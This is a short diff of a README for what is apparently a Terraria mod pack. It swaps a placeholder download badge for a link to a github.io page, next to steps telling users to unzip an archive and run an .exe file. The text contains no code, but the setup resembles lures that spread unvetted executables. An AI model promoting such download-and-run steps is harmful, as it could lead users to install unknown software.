@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://terraria-ultimate-mod-pack.github.io/.github/)
 
 ## 📸 Overview
 ![terraria-ultimate-bosses](https://github.com/user-attachments/assets/52aa811d-40a3-4a56-b149-0b2dfe919a05)
